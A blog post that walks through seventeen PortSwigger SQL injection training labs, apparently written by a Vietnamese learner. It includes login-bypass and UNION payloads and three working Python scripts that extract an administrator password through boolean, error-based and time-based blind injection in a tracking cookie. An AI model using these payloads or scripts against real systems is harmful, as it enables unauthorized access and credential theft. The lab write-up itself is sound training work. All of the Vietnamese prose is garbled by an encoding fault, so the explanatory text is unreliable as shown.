---
layout: post
title:  "SQL Injection"
date:   2025-07-22 12:00:00 +0700
tags: PortSwigger
categories: jekyll update
---

# SQL Injection 

## LAB 01 

![image](https://hackmd.io/_uploads/BJQHgvoIge.png)

Trong lab n√†y khi t√¨m ki·∫øm th√¨ n√≥ s·∫Ω th·ª±c hi·ªán c√¢u query tr√™n. 

N√™n m√¨nh truy·ªÅn payload sau: `' OR 1=1-- -`

![image](https://hackmd.io/_uploads/rkMGfDiIel.png)

#### Nguy√™n nh√¢n g√¢y l·ªói

Do c√¢u query vi·∫øt d∆∞·ªõi d·∫°ng n·ªëi chu·ªói.

## LAB02 

![image](https://hackmd.io/_uploads/BJ2aGDsUxx.png)

Trong lab n√†y m√¨nh ph·∫£i bypass login. V√† do ƒë√≥, m√¨nh th·ª≠ c√°c payload nh∆∞ `'` hay `"` ƒë·ªÉ bi·∫øt xem n√≥ c√≥ vi·∫øt n·ªëi chu·ªói ko. Nh∆∞ng k·∫øt qu·∫£ ko tr·∫£ v·ªÅ l·ªói g√¨. 

Cho n√™n m√¨nh d√πng c√°c payload nh∆∞ sau: `administrator'-- -` ho·∫∑c `administrator"-- -` inject v√†o ph·∫ßn `username`

Sau khi, th·ª≠ payload `administrator'-- -` th√¨ v√†o ƒë∆∞·ª£c account `admin`

![image](https://hackmd.io/_uploads/ByDoEDsIlg.png)

## LAB03 

Trong lab n√†y, m√¨nh ph·∫£i l·∫•y ƒë∆∞·ª£c version c·ªßa database.

Cho n√™n truy·ªÅn payload `' ORDER BY <s·ªë_c·ªôt>-- -` ƒë·ªÉ th·ª±c hi·ªán t·∫•n c√¥ng theo c√¢u l·ªánh `UNION`

![image](https://hackmd.io/_uploads/r1bcLPjLxl.png)

D√≤ 3 th√¨ n√≥ l·ªói cho n√™n c√¢u query ƒë·∫ßu n√≥ ch·ªâ c√≥ 2 c·ªôt. 
R·ªìi m√¨nh ph·∫£i x√°c ƒë·ªãnh c·ªôt n√†o c√≥ th·ªÉ ch·ª©a chu·ªói hay l√† s·ªë. 
Nh∆∞ng m√† c·∫£ hai c·ªôt ƒë·ªÅu chu·ªói.

![image](https://hackmd.io/_uploads/r15M5DsUxl.png)

ƒê·ªÉ l·∫•y ƒë∆∞·ª£c version c·ªßa database ph·∫£i d·ª±a v√†o c√∫ ph√°p t·ª´ng lo·∫°i DB. V√† DB ƒëang khai th√°c l√† Oracle. 

![image](https://hackmd.io/_uploads/S1pOcPiIee.png)

N√™n truy·ªÅn payload v√†o nh∆∞ sau:

![image](https://hackmd.io/_uploads/HkXfoPoUle.png)

## LAB04 

Trong lab n√†y t∆∞∆°ng t·ª± nh∆∞ LAB03 nh∆∞ng k√≠ch ho·∫°t tr√™n database kh√°c th√¥i. 

![image](https://hackmd.io/_uploads/B1xI3DjLgx.png)

## LAB05 

Lab n√†y ph·∫£i li·ªát k√™ n·ªôi dung c·ªßa database tr√™n c√°c DB ko ph·∫£i Oracle. 

C≈©ng th·ª±c hi·ªán d√≤ c·ªôt v√† t·∫•n c√¥ng UNION. Sau khi d√≤ xong th√¨ c≈©ng ph·∫£i bi·∫øt DB m√¨nh ƒëang d√πng l√† lo·∫°i n√†o. N√™n th·ª≠ select c√°c version.

![image](https://hackmd.io/_uploads/SyLR0PsLee.png)

N√≥ d√πng `PostgreSQL` th√¨ ph·∫£i khai th√°c theo lo·∫°i DB n√†y. 

Truy·ªÅn payload sau ƒë·ªÉ c√≥ l·∫•y `table_name`

![image](https://hackmd.io/_uploads/BJlOKb_jUge.png)

Ti·∫øp theo l√† l·∫•y t√™n c·ªôt. 

![image](https://hackmd.io/_uploads/B1sGMOiLgl.png)

T·ª´ ƒë√¢y, c√≥ th·ªÉ tr√≠ch xu·∫•t th√¥ng tin. 

![image](https://hackmd.io/_uploads/rk_DM_jIxx.png)

## LAB06 

Lab n√†y t∆∞∆°ng t·ª± lab5 nh∆∞ng s·∫Ω tr√™n DB Oracle. 

T∆∞∆°ng t·ª± c√°c b∆∞·ªõc nh∆∞ l·∫•y t√™n b·∫£ng, t√™n c·ªôt v√† tr√≠ch xu·∫•t d·ªØ li·ªáu.

![image](https://hackmd.io/_uploads/rk3dBdjLgg.png)

T·ª´ ƒë√¢y l·∫•y ƒë∆∞·ª£c t√™n b·∫£ng. 

![image](https://hackmd.io/_uploads/HkUCHus8le.png)

V√† l·∫•y t√™n c·ªôt. 

![image](https://hackmd.io/_uploads/SJjGIds8gl.png)

Cu·ªëi c√πng l√† tr√≠ch xu·∫•t data.

![image](https://hackmd.io/_uploads/B1mF8_j8eg.png)

## LAB07 

Lab n√†y m√¨nh ph·∫£i x√°c ƒë·ªãnh s·ªë c·ªôt. Th√¨ m√¨nh d√≤ theo payload sau. 

![image](https://hackmd.io/_uploads/r1J95Oi8gl.png)

## LAB08 

Lab n√†y x√°c ƒë·ªãnh s·ªë c·ªôt v√† c·ªôt n√†o c√≥ th·ªÉ ch·ª©a chu·ªói. 

![image](https://hackmd.io/_uploads/HysondoLle.png)

## LAB09 

Lab n√†y th√¨ l√†m t∆∞∆°ng t·ª± tr√≠ch xu·∫•t data.

![image](https://hackmd.io/_uploads/B1X8gKo8ex.png)

## LAB10 

Lab n√†y c≈©ng tr√≠ch xu·∫•t data v√† lo·∫°i DB n√†y l√† PostgreSQL. 

![image](https://hackmd.io/_uploads/B1a-7KjUgx.png)

![image](https://hackmd.io/_uploads/r1sWLKoLlg.png)

![image](https://hackmd.io/_uploads/B12Q8KjUeg.png)

## LAB11 

Lab n√†y li√™n quan ƒë·∫øn Blind SQLi, li√™n quan ƒë·∫øn trang login l√∫c n√†o c≈©ng c√≥ `Welcomeback!`

N√™n m√¨nh th·ª≠ inject nh∆∞ sau: 

![image](https://hackmd.io/_uploads/HkaKL9oLlg.png)

![image](https://hackmd.io/_uploads/rkNo89iLel.png)

V√† m·ª•c ti√™u b√†i n√†y c≈©ng ch·ªâ ƒë·ªÉ l·∫•y password c·ªßa administrator. Cho n√™n m√¨nh vi·∫øt script nh∆∞ sau. 

```python= 
import requests 
import sys 

def send_requests(payload):
    burp0_url = "https://0a7a00320368fdfa808a94b500110036.web-security-academy.net:443/"
    burp0_cookies = {"TrackingId": f"OtnJwcRuDcx7K8wH' {payload}", "session": "EoLrMPQY699qQw5pIWM1HPX7jPAjZGcl"}
    burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "en-US,en;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0a7a00320368fdfa808a94b500110036.web-security-academy.net/login", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}
    res = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    return res.text

length_pw = 0 
for i in range(1, 50):
    payload = f"AND (SELECT length(password) FROM users WHERE username=\'administrator\') < {i}-- -"
    response = send_requests(payload)
    print(f"üß™ ƒêang th·ª≠ v·ªõi i = {i}", end='\r')
    if "Welcome back!" in response:
        length_pw = i
        print(f"‚úÖ ƒê·ªô d√†i password: {i}")
        break

password = ""
for i in range(1, length_pw + 1):
    left = 32 
    right = 126 
    while left <= right: 
        mid = (left + right) // 2
        payload = f"AND ASCII(SUBSTR((SELECT password FROM users WHERE username=\'administrator\'),{i},1)) > {mid}-- -"
        response = send_requests(payload)
        if "Welcome back!" in response:
            left = mid + 1 
        else: 
            right = mid - 1
    password += chr(left) 
    sys.stdout.write(f"\r‚úÖ Password l√†: {password}")
    sys.stdout.flush()
```

![image](https://hackmd.io/_uploads/ByMfVojLgx.png)

## LAB12 

Lab n√†y c≈©ng l√† blind SQL nh∆∞ng n√≥ ch·ªâ hi·ªÉn th·ªã l·ªói ho·∫∑c kh√¥ng d·ª±a v√†o c√¢u ƒëi·ªÅu ki·ªán ta ƒë∆∞a v√†o. 

```python=
import requests 
import sys 
from urllib.parse import quote 

def send_requests(payload):
    encoded = quote(payload, safe='')
    burp0_url = "https://0adf005303f9a1c48033081000dc00f9.web-security-academy.net:443/"
    burp0_cookies = {"session": "TezivjQqU9jPCo0xTexLdoaV7CK0Q1Vn", "TrackingId": f"jt1UFufs2K7hjyZ8{encoded}"}
    burp0_headers = {"Sec-Ch-Ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "en-US,en;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0adf005303f9a1c48033081000dc00f9.web-security-academy.net/", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}
    res = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    return res.status_code
    
    
length_pw = 0 
for i in range(1, 50):
    payload = f"'||(SELECT CASE WHEN (username='administrator' AND length(password) < {i}) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE ROWNUM=1)||'"
    response = send_requests(payload)
    print(f"üß™ ƒêang th·ª≠ v·ªõi i = {i}", end='\r')
    if response == 500:
        length_pw = i
        print(f"‚úÖ ƒê·ªô d√†i password: {i}")
        break

password = ""
for i in range(1, length_pw + 1):
    left = 32 
    right = 126 
    while left <= right: 
        mid = (left + right) // 2
        payload = f"'||(SELECT CASE WHEN (username='administrator' AND ascii(SUBSTR(password,{i},1)) > {mid}) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE ROWNUM=1)||'"
        response = send_requests(payload)
        if response == 500:
            left = mid + 1 
        else: 
            right = mid - 1
    password += chr(left) 
    sys.stdout.write(f"\r‚úÖ Password l√†: {password}")
    sys.stdout.flush()
``` 

![image](https://hackmd.io/_uploads/B1zLmpjLee.png)

## LAB13 

Lab n√†y ch·ªâ ƒë·ªÉ k√≠ch ho·∫°t time delay, v√† m√¨nh ph·∫£i d√≤ payload qua c√°c lo·∫°i DB. 

![image](https://hackmd.io/_uploads/H11Jv6sUxx.png)

## LAB14 

Lab n√†y t∆∞∆°ng t·ª± lab13 nh∆∞ng m√¨nh ph·∫£i d√πng c√¢u ƒëi·ªÅu ki·ªán ƒë·ªÉ c√≥ th·ªÉ tr√≠ch xu·∫•t d·ªØ li·ªáu. 
M√¨nh th·ª≠ qua c√°c payload v√† x√°c ƒë·ªãnh ƒë√¢y l√† lo·∫°i DB postgreSQL. 

```python=
import requests 
import sys
import time 
from urllib.parse import quote 

def send_requests(payload):
    encoded = quote(payload, safe='')
    burp0_url = "https://0aaa0079047a840c82135bfa00bd0098.web-security-academy.net:443/"
    burp0_cookies = {"TrackingId": f"F6yWayH4TIfZGUQN{encoded}", "session": "OTIV0PYgxUc6tWb0op6nWj6OOd26sOPc"}
    burp0_headers = {"Sec-Ch-Ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "en-US,en;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0aaa0079047a840c82135bfa00bd0098.web-security-academy.net/filter?category=Gifts", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}
    start_time = time.time()
    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    end_time = time.time() - start_time 
    return end_time 
    
length_pw = 0 
for i in range(1, 50):
    payload = f"'|| (SELECT CASE WHEN (username='administrator' AND length(password)={i}) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users)--"
    response = send_requests(payload)
    print(f"üß™ ƒêang th·ª≠ v·ªõi i = {i}", end='\r')
    if response > 2:
        length_pw = i
        print(f"‚úÖ ƒê·ªô d√†i password: {i}")
        break

password = ""
for i in range(1, length_pw + 1):
    left = 32 
    right = 126 
    while left <= right: 
        mid = (left + right) // 2
        payload = f"'||(SELECT CASE WHEN (username='administrator' AND ascii(SUBSTR(password,{i},1)) > {mid}) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users)--"
        response = send_requests(payload)
        if response > 2:
            left = mid + 1 
        else: 
            right = mid - 1
    password += chr(left) 
    sys.stdout.write(f"\r‚úÖ Password l√†: {password}")
    sys.stdout.flush()
``` 
![image](https://hackmd.io/_uploads/H1s-tK38xg.png)

## LAB15 

Lab n√†y l√† m·ªôt k·ªπ thu·∫≠t `out-of-band` c·ªßa SQLi. M·ª•c ti√™u c·ªßa lab n√†y l√† g·ª≠i 1 request ƒë·∫øn 1 DNS m√† do attacker ƒë√£ d·ª±ng s·∫µn. ·ªû ƒë√¢y m√¨nh d√πng Burp Collaborator. 

M√¨nh t·∫°o ra 1 domain tr∆∞·ªõc. 

![image](https://hackmd.io/_uploads/BkMN6Y28ee.png)

V√† sau ƒë√≥, m√¨nh th·ª≠ c√°c payload ƒë·ªÉ x√°c ƒë·ªãnh lo·∫°i DB m√† payload ƒë√≥ ph·∫£i ƒë∆∞·ª£c g·ª≠i t·ªõi domain ƒë√£ d·ª±ng. 

![image](https://hackmd.io/_uploads/Hyu4J9hUxx.png)

![image](https://hackmd.io/_uploads/rkrSk92Uge.png)

## LAB16 

Lab n√†y gi·ªëng lab tr√™n c≈©ng d√πng k·ªπ thu·∫≠t out-of-band nh∆∞ng m√¨nh ph·∫£i tr√≠ch xu·∫•t l·∫•y d·ªØ li·ªáu. 

C≈©ng l√†m t∆∞∆°ng t·ª± nh∆∞ng th√™m payload v√†o ƒë·ªÉ tr√≠ch xu·∫•t password c·ªßa administrator v√†o ph·∫ßn ƒë·∫ßu c·ªßa domain ƒë·ªÉ th·ª±c hi·ªán query. 

![image](https://hackmd.io/_uploads/Bko-45n8lx.png)

Ph·∫ßn ƒë·∫ßu tr∆∞·ªõc domain l√† password. 

## LAB17 

Lab n√†y ta ph·∫£i khai th√°c d·ª±a tr√™n 1 web s·ª≠ d·ª•ng XML. V√† c√≤n c√≥ c∆° ch·∫ø b·∫£o v·ªá c·ªßa WAF n·ªØa. V√† m√¨nh khai th√°c d·ª±a tr√™n 2 tham s·ªë `productId` v√† `storeId`. 

ƒê·∫ßu ti√™n, m√¨nh th·ª≠ inject v√†o t·ª´ng tr∆∞·ªùng xem nh∆∞ th·∫ø n√†o. 

![image](https://hackmd.io/_uploads/Sy2iO53Lle.png)

![image](https://hackmd.io/_uploads/Bkfau93Lle.png)

C·∫£ hai tr∆∞·ªùng ƒë·ªÅu b·ªã WAF ch·∫∑n. 

Nh∆∞ng n·∫øu m√¨nh d√πng tool Hackvertor, ƒë·ªÉ encode th√¨ xem nh∆∞ th·∫ø n√†o. 

![image](https://hackmd.io/_uploads/rJVQhc2Uxg.png)

Sau ƒë√≥, m√¨nh th·ª≠ truy·ªÅn l·∫°i t·∫°i tab repeater. 

![image](https://hackmd.io/_uploads/SyRmh5h8xg.png)

N√≥ v·∫´n tr·∫£ v·ªÅ k·∫øt qu·∫£ b√¨nh th∆∞·ªùng nh∆∞ v·∫≠y n√≥ ho·∫°t ƒë·ªông b√¨nh th∆∞·ªùng sau khi encode n√™n m√¨nh thay n√≥ l·∫°i b·∫±ng payload nh∆∞ sau: `1 UNION SELECT NULL`

![image](https://hackmd.io/_uploads/Hk3Khq3Uxl.png)

Nh∆∞ v·∫≠y m√¨nh th·ª≠ ki·ªÉm tra xem c·ªôt n√†y c√≥ ph·∫£i chu·ªói ko. 

![image](https://hackmd.io/_uploads/H1UA2c2Ugg.png)

Sau c√πng, m√¨nh s·∫Ω extract ƒë∆∞·ª£c password. 

![image](https://hackmd.io/_uploads/ryBLaqhIeg.png)

K·∫øt qu·∫£ m√¨nh khai th√°c ƒë∆∞·ª£c. 

![image](https://hackmd.io/_uploads/rkSdp5nIgl.png)
